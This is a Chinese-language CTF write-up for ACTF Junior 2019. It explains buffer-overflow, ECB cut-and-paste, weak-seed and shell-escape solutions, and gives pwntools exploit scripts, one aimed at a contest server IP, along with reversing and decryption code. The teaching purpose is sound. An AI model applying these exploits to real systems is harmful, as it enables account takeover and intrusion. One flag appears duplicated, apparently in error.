---
title: ACTF Junior 2019 Official WriteUP of CSUWangj's Challenge
connments: true
date: 2019-02-28 15:55:24
tags: 
	- CTF
	- Crypto
	- Misc
	- Forensics
	- PWN
categories: WriteUp
desc: 
summary: 真香
---

日常出锅、、、

<!--more-->

# Linux&PWN

## vim

首先要了解vim的几个模式

然后vim在普通模式下是可以执行Linux命令的，然后就可以ls, cat flag之类的了。

感谢各位没有把容器玩坏。

## No_more_gets1

查看[源码](https://github.com/CSUwangj/ACTF_Junior_2019/blob/master/Linux%26PWN/No_more_gets2/src/src.c)，问题出在[第140行（rigist()+12）](https://github.com/CSUwangj/ACTF_Junior_2019/blob/master/Linux%26PWN/No_more_gets1/src/src.c#L140)，passwdbuf在namebuf前面，所以gets的时候可以把namebuf覆盖掉，于是就能强行注册一个密码自己设定的admin。

一个可用的exp（来自给力的学弟）如下：

```python
from pwn import *
import sys
# context.log_level='debug'

if args['REMOTE']:
    sh = remote(sys.argv[1], sys.argv[2])
else:
    sh = process("./a.out")

payload=0x10 * 'a' + p64(0x0) + p64(0x555555555607)

sh.recvuntil("6) Exit")
sh.sendline("3")
#gdb.attach(sh)
#gdb.attach(sh)
sh.recvuntil("Input your name")
sh.sendline('father')
sh.recvuntil('Input your password')
sh.sendline('aaaaaaaaaaaaaaa\0admin\0')
sh.recvuntil("6) Exit")
sh.sendline('2')
sh.sendline('admin')
sh.sendline('aaaaaaaaaaaaaaa')
sh.sendline('4')
print sh.recvuntil('}')
sh.sendline('6')
```

## Special_Shell

这个题是HGAME2018里看到的，感觉很有意思，YTB上有更详细的视频。

[**源码**](https://github.com/CSUAuroraLab/ACTF_Junior_2019/blob/master/Linux%26PWN/Special_Shell/src/src.c)

有两个预期解，一方面来说，假如去阅读system()的[手册](https://linux.die.net/man/3/system)会看到

> Do not use **system**() from a program with set-user-ID or set-group-ID privileges, because strange values for some environment variables might be used to subvert system integrity. Use the ***exec**(3)* family of functions instead, but not ***execlp**(3)* or ***execvp**(3)*.

如果去找一些可能的实现可能可以看到下面这样的

```c
int system(const char *command)
{
    /* balabala */
        execl("/bin/sh", "sh", "-c", command, (char *) NULL);
        _exit(127);                     /* We could not exec the shell */

    /* balabala */
    return status;
}
```

所以用`$0`是可以getshell的。

另一方面来说，`man bash`一下，了解一下`meta character in bash`，可以用`/???/?? .`得出目录，然后`/???/??? ????`看到flag。

## No_more_gets2

查看[源码](https://github.com/CSUwangj/ACTF_Junior_2019/blob/master/Linux%26PWN/No_more_gets2/src/src.c)，问题出在开始就莫名其妙的[输入用户名](https://github.com/CSUwangj/ACTF_Junior_2019/blob/master/Linux%26PWN/No_more_gets2/src/src.c#L41)。

只需要了解一下字节序、ascii码，这题就能解决了。

# Crypto

## casear

移位密码，加密时偏移量为+2，没有改变数字、大小写这几个属性

至于你说那么多人把数字改成字母、、、

算了，心累，这题提交失败超过20次的，线下逮到出题人请吃饭。。。

## 矾书

就是把字符画的主体换成了白色字体保存成PDF。

大家还是很机灵的，顺便如果有个正好符合需求的PDF浏览器，这个题会解决得很快。

{% asset_img test.png %}

## 反切码

这里我偷了懒，并没有深入地考察这个东西、、、只需要百度就能找到出处，因为古音有八个读音，而现在只有四个，所以特地注明了一下用普通话来读。

（其实当时想吃的是火锅，但是缺声母来着）

## Tiny RSA

就是一个非常非常naive的RSA，简易到可以用手算，希望大家对将要到来的**段老师**教授的密码学有所期待，段老师真的超好！

（貌似18级开始只有信安才有密码学，但是明明计算机相关的都应该学一点）

## So called ECB

只要学到密码学的加密模式肯定会说到不要使用ECB的，而这里为了降低还特地把用户名、密码什么的分开加密再拼接，然而没有人做，感觉很不爽，不想给exp...

```python
from pwn import *
# context.log_level='debug'

def regist(r, name, passwd):
	print "[*] Resitering Account"
	r.sendline('1')
	r.sendline(name)
	r.sendline(passwd)
	r.recvuntil('to {}'.format(name))
	print "[+] Succeed"
	return r.recv()[2:130]

def transfer(r, name, passwd, to, amount):
	print "[*] Transferring"
	r.sendline('2')
	r.sendline(name)
	r.sendline(passwd)
	r.sendline(to)
	r.sendline(str(amount))
	r.recvuntil('to {}'.format(to))
	print "[+] Succeed"
	return r.recv()[2:130]
	
r = remote("47.107.33.15", 45338)
name = 'a'
passwd = 'a'
admin = 'admin'
payload = regist(r, name, passwd)[:96]
payload += transfer(r, name, passwd, admin, 1001)[96:128]
print "[*] Stealing money from admin"
for i in range(10):
	r.sendline('3')
	r.sendline(payload)
print "[+] Done"
print "[*] Querying flag"
r.sendline('5')
r.sendline(name)
r.sendline(passwd)
flag = r.recvuntil("}")
index = -1
try:
	index = flag.index('actf')
except:
	index = flag.index('ACTF')
flag = flag[index:]
print "[flag] {}".format(flag)
```

## Broken Random

这题毕竟源码都给了，要点也都提示到了，其实没什么难度。

直接的攻击点在于[srand(time(NULL))](https://github.com/CSUwangj/ACTF_Junior_2019/blob/master/Crypto/Broken%20Random/src/src.c#L14)

srand()的效果是给rand()设置种子，问题就在于用[time(NULL)](https://linux.die.net/man/2/time)。

从文档里可以知道，time(NULL)返回从1970-01-01 00:00:00 +0000 (UTC)开始到现在的**秒**数。

所以至少有以下几种攻击方式：

1. 同时开两个terminal，同时nc一下就很有可能让两个程序用同一个种子，只需要读一个写一个就行。
2. 把程序自己编译一遍，一边nc一边运行。
3. 暴力猜一下服务器的时间。（本地暴力）。

## RSA Lab

RSA相关的小问答，没什么难度。实际上这个才是tiny RSA，之前那个算是趣味小游戏的程度:D

## HappyBirthday

生日攻击啊、、、

听到有人说这个难度大，我已经把难度降低过了 ，原来的长度有56，60和64的、、、

50位的话，碰撞一次的代价大概是$2^{25}$。

---

好的，前面一顿分析全当放屁，愚蠢的出题人想当然认为[:50]是前50位而忘记了那是十六进制的问题。所以正常难度应该是把代码改成[:13]或者[:12]。。。

EXP没什么好放的吧，就跑跑暴力的事情。

## Non-cryptography Hash

这个题是看起来难的其实一点也不难的题，因为它的值域一共就、、、那么多、、、

所以，不管是直接暴力，还是暴力建表然后查找，理论上都是可行的、、、

## 点击英雄1存档修改

这个就不说了吧，也没有人问我，看起来都不想放弃游戏体验呢

# Forensics

这部分题目我个人感觉解法是很多的，在我的认知里取证和渗透类似，不同的人不同的工具都会有不同的效果，而且可能都可以达成目的，这里的解答仅作参考，如果有什么特别的解法请[告知我](mailto:CSUwangj@protonmail.com)，万分感激。

顺便这几个题对flag的字符串都没有做什么隐藏，所以除了一个人以外都是strings/脱壳后strings解出来的，令出题人感到非常伤心，这根本不好玩嘛

## Popbox

重定向输出流即可，cmd下可以直接>，powershell需要用Out-File。

## DoNothing

找程序，可以从启动项/任务管理器里找到一个不一样svchost.exe。

接下来可以通过查看这个程序相关的活动找到输出文件，里面含有flag。

也可以直接查看系统里所有的IO/网络/注册表等的操作情况来查找。这里推荐一下微软的工具箱SysinternalSuite里的procmon。

## Memory

flag放在程序的栈上面的，dump下来找一下就行了。

也可以直接在内存里找。

## WireFish

WireShark抓一下就出来了

---

这条分割线以下不是我出的，代发一下

---

# Reverse

## show me the code

我们只看比较关键的给出的代码：

```c
for (int i = 1; keystr[i]; i++) {
		keystr[i] ^= keystr[i-1];
		keystr[i] += 2;
	}
...
if(!strcmp(keystr,enstr)){
    ...
}
else{
    ...
}
```

用户的输入在经过for循环的操作之后与enstr字符串比对，若相同则提示输入正确，所以我们要做的就是从给出的enstr字符串和for循环里的操作来__逆推__出正确的输入应该是怎样的。

for循环里从第1位字符开始每个字符异或上一位的字符之后加2，加的逆操作是减，而异或的逆操作则是再次异或相同的数，比如说(a^b)^b = a ，所以我们的逆操作应该是从enstr最后一位字符开始，每一位先减2再异或前一位，循环至第1位，代码如下：

```c
## include<stdio.h>

int main(){
    char enstr[]={0x41,0x04,0x52,0x16,0x6f,0x3a,0x10,0x23,0x42,0x74,0x1b,0x31,0x70,0x49,0x7b,0x26,0x56,0x64,0x3d,0x4c,0x7e,0x0e,0x41,0x27,0x08,0x77};
    for(int j=25;j>=1;j--){
		enstr[j] -= 2;
		enstr[j] ^= enstr[j-1];
	}
	printf("%s",enstr);
    return 0;
}
```

得到flag：__ACTF{W41c0m4_70_r4_w0r1d!}__



## 食我ida啦

这一题主要是想做一个工具使用的引导，如题所说需要掌握ida的一个最基本的用法，即反编译二进制文件后找到主函数，按下F5查看c代码。

在这一题里做到这一步就能直观地取得flag：__ACTF{L15e_1da_d0_rEveR53}__

（由于出题人图样，flag直接明文存放，可以直接放到二进制编辑器中搜索到flag的大部分。挨打×1）



## simple packer

壳是程序本身为了达成防护或者减小体积的一种手段，根据目的不同分为加密壳和压缩壳。加了壳的程序无法直接进行逆向分析，一般的应对手段是脱壳。

本题采用的壳是upx 2.03，属于压缩壳中比较常见的一种。对于这种壳不需要自己手动脱壳，借助[工具](https://pan.baidu.com/s/15P9RMXuitwS3CBl3PFVlig)(提取码a8rs)可以完成脱壳的工作。本题主要的目的也是让入门的同学们认识到脱壳这一过程，脱完壳后使用ida进行分析可以直接拿到flag：

__ACTF{L15e_1da_d0_rEveR53}__

有关壳的其他相关知识感兴趣的同学可以接下来前往吾爱破解等安全相关论坛学习，里面有丰富的资料。

（由于出题人再次图样，flag又直接明文存放，之前提到的操作可以搜索到完整的flag。绝赞挨打中qwq）



## simple asm

根据给出的c代码我们可以知道这整个程序的流程很简单，要求输入flag后，把输入传入func函数，以func函数的返回值判断用户输入的是否为正确的flag，所以现在要做的就是分析func函数的功能从而解出flag。接下来开始一步步分析给出的func函数的汇编码：

最开始的这一段分析需要掌握栈帧以及函数调用约定的相关知识，这里直接给出分析的结果：

```assembly
   0x0006fa <+0>:	push   rbp
   0x0006fb <+1>:	mov    rbp,rsp
   0x0006fe <+4>:	mov    QWORD PTR [rbp-0x18],rdi
   0x000702 <+8>:	mov    DWORD PTR [rbp-0x4],0x0
```

在simple.c中我们知道有这样一个调用：``func(input)`` ，而上面的汇编代码实现的是将参数``input``的地址保存到``[rbp-0x18]``这个地方。之后``[rbp-0x4]``则作为一个局部变量，为其赋值为``0x0``。到这里我们可以尝试还原一下c代码：

```c
int func(char *input){
    int i=0x0;
    ...
}
```

我们将``[rbp-0x4]``假设为int型变量i，``[rbp-0x18]``假设为指向用户输入字符串首地址的指针input，往后看:

```assembly
 0x000709 <+15>:	jmp    0x75d <func+99>
 ...
 0x00075d <+99>:	cmp    DWORD PTR [rbp-0x4],0x15
 0x000761 <+103>:	jle    0x70b <func+17>
```

跳转到<func+99>后将``[rbp-0x4]``中的值（也就是i）与``0x15``比较，只要不大于``0x15``就会跳转到<func+17>处。因为i的初值为``0x0``，所以会实现跳转。

```assembly
 0x00070b <+17>:	mov    eax,DWORD PTR [rbp-0x4]
 0x00070e <+20>:	movsxd rdx,eax
 0x000711 <+23>:	mov    rax,QWORD PTR [rbp-0x18]
 0x000715 <+27>:	add    rax,rdx
 0x000718 <+30>:	movzx  edx,BYTE PTR [rax]
```

根据先前的假设，前四行相当于完成了``(input+i)``,使input指向第i位字符；再看最后的``movzx  edx,BYTE PTR [rax]``,这里实现了寻址到``(input+i)``所表示的地址处并将此地址内存储的值传给edx，写成伪c代码相当于``edx = *(input + i)`` 。

```assembly
 0x00071b <+33>:	mov    eax,DWORD PTR [rbp-0x4]
 0x00071e <+36>:	movsxd rcx,eax
 0x000721 <+39>:	mov    rax,QWORD PTR [rbp-0x18]
 0x000725 <+43>:	add    rax,rcx
 0x000728 <+46>:	add    edx,0x7
 0x00072b <+49>:	mov    BYTE PTR [rax],dl
```

这里是比较关键的一个点，前四行进行的是与上一段相同的工作，到了第五行出现了使``edx``的值加7的操作，而在之前的分析中此时``edx``中存放的是``*(input+i)``，最后一行则是将加7之后的结果赋给原``(input+i)``的地址处。综上，上面的两段汇编实现了:  `` *(input+i) += 7``，继续往下看：

```assembly
   0x00072d <+51>:	mov    eax,DWORD PTR [rbp-0x4]
   0x000730 <+54>:	movsxd rdx,eax
   0x000733 <+57>:	mov    rax,QWORD PTR [rbp-0x18]
   0x000737 <+61>:	add    rax,rdx
   0x00073a <+64>:	movzx  ecx,BYTE PTR [rax]
   0x00073d <+67>:	mov    eax,DWORD PTR [rbp-0x4]
   0x000740 <+70>:	movsxd rdx,eax
   0x000743 <+73>:	lea    rax,[rip+0x2008f6]        ##  0x201040 <enstr>
   0x00074a <+80>:	movzx  eax,BYTE PTR [rdx+rax*1]
```

前5行做的是一样的事，写成伪代码就是 ``ecx = *(input + i)`` ; 之后2行则为``rdx = i``; 最后2行比较关键，`` lea    rax,[rip+0x2008f6] ``所做的是将simple.c中给出的字符数组``enstr``的首地址存入``rax``，而后综合前面的分析可以得出伪代码`` eax = *(enstr + i)``，之后是比较和跳转操作：

```assembly
   0x00074e <+84>:	cmp    cl,al
   0x000750 <+86>:	je     0x759 <func+95>
   0x000752 <+88>:	mov    eax,0x1
   0x000757 <+93>:	jmp    0x768 <func+110>
   0x000759 <+95>:	add    DWORD PTR [rbp-0x4],0x1
   0x00075d <+99>:	cmp    DWORD PTR [rbp-0x4],0x15
   0x000761 <+103>:	jle    0x70b <func+17>
   0x000763 <+105>:	mov    eax,0x0
   0x000768 <+110>:	pop    rbp
   0x000769 <+111>:	ret
```

由之前的分析可以很容易看懂这里第一行的``cmp``操作:``*(input + i)``与``*(enstr + i)``比对（此时``*(input + i)``已经经过了加7的操作），相等则跳转到<func+95>继续执行，i的值加1，又进入<func+99>处的判断（可知这里应该是个while循环），直到i的值大于0x15后，给``eax``赋0，即此函数的返回值将为0，退回栈帧后返回；不相等则给``eax``赋1，即此函数的返回值将为1，跳转到<func+110>退回栈帧后返回。综合所有分析，完成c代码的还原:

```c
int func(unsigned char *input){
	for(int i=0;i<=21;i++){
		input[i]+=7;
		if(input[i]!=enstr[i]){
			return 1;
		}
	}
	return 0;
}
```

我们只要将给出的``enstr``所有值减7，就能拿到flag：

__ACTF{a5m_15_1mp0r7an7} __



## 关于我F5以后还是搞不懂他在想些什么这档事

把文件放入ida分析，进入``main`` 函数以后F5查看c代码。在接收用户输入以后有很长的一段代码：

```c
  v3 = malloc(0x82uLL);
  v14 = v3;
  v4 = qword_55FA3685F068;
  *(_QWORD *)v3 = func_s;
  *((_QWORD *)v3 + 1) = v4;
  v5 = qword_55FA3685F078;
  *((_QWORD *)v3 + 2) = qword_55FA3685F070;
  *((_QWORD *)v3 + 3) = v5;
  v6 = qword_55FA3685F088;
  *((_QWORD *)v3 + 4) = qword_55FA3685F080;
  *((_QWORD *)v3 + 5) = v6;
  v7 = qword_55FA3685F098;
  *((_QWORD *)v3 + 6) = qword_55FA3685F090;
  *((_QWORD *)v3 + 7) = v7;
  v8 = qword_55FA3685F0A8;
  *((_QWORD *)v3 + 8) = qword_55FA3685F0A0;
  *((_QWORD *)v3 + 9) = v8;
  v9 = qword_55FA3685F0B8;
  *((_QWORD *)v3 + 10) = qword_55FA3685F0B0;
  *((_QWORD *)v3 + 11) = v9;
  v10 = qword_55FA3685F0C8;
  *((_QWORD *)v3 + 12) = qword_55FA3685F0C0;
  *((_QWORD *)v3 + 13) = v10;
  v11 = qword_55FA3685F0D8;
  *((_QWORD *)v3 + 14) = qword_55FA3685F0D0;
  *((_QWORD *)v3 + 15) = v11;
  *((_WORD *)v3 + 64) = word_55FA3685F0E0;
```

这一段其实耐心看完不难发现，完成的其实只是将以``func_s``为首地址的之后130个字节的数据拷贝到以``v3``为首地址的空间里，相当于``memcpy((char *)v3,func_s,130);``。之后的内容则是将这段数据从``v3``开始，每个字节都异或``0x23``:

```c
  v17 = v14;
  v16 = 0;
  while ( v16 <= 129 )
  {
    *v17 ^= 0x23u;
    ++v16;
    ++v17;
  }
```

完成这一步后出现了一个不太寻常的操作：``((void (__fastcall *)(char *, char *))v14)(v13, v13);`` 将这一段数据当作了函数并且传入参数``v13``调用了它。最后就到了验证flag的环节。flag当然不会原模原样的放在验证数组里（经过两次挨打的出题人终于不再图样了），所以我们还是要搞清楚这段数据被当作函数调用以后对用户的输入做了什么操作。

问题来了，该怎么分析这段数据呢？一个比较省力的办法是使用ida的动态调试功能（因为是elf文件所以需要在linux的虚拟机里进行远程调试，具体的操作方法搜一蛤就能找到），在调用这段数据时下断点，程序自己运行到断点处时，单步进入，创建函数后再使用F5功能，就能看到这段数据被当作函数时是怎样的代码。经由上述操作，我们进入了获得了这段函数的代码：

```c
__int64 __fastcall sub_56389A4F1830(__int64 a1)
{
  int i; // [rsp+14h] [rbp-4h]

  for ( i = 0; *(_BYTE *)(i + a1); ++i )
    *(_BYTE *)(i + a1) = (*(unsigned __int8 *)(i + a1) << 32) & ((signed int)*(unsigned __int8 *)(i + a1) >> 32) ^ 0xCC;
  return 0LL;
}
```

a1为用户输入，经历for循环中的移位、和、异或系列操作后返回。之后就是验证环节。运算操作没有很复杂，以下是解密代码：

```c
## include<stdio.h>

int main() {
	char str[]={0x8d,0x8f,0x98,0x8a,0xb7,0xbf,0xa3,0xa0,0xba,0xa9,0x93,0xbb,0xa5,0xb8,0xa4,0x93,0xa8,0xb5,0xa2,
	0xad,0xa1,0xa5,0xaf,0x93,0xa8,0xa9,0xae,0xb9,0xab,0xab,0xa5,0xa2,0xab,0xb1};
	for(int i=0;i<=33;i++){
		for(char input = 0x20;input<=0x7e;input++){
			char input_m;
			input_m = ((input<<32)&(input>>32)^0xcc);
			if(input_m == str[i]){
				printf("%c",input);
				break;
			}
		}
	}
	return 0;
  
}
```

得到flag：__ACTF{solve_with_dynamic_debugging}__

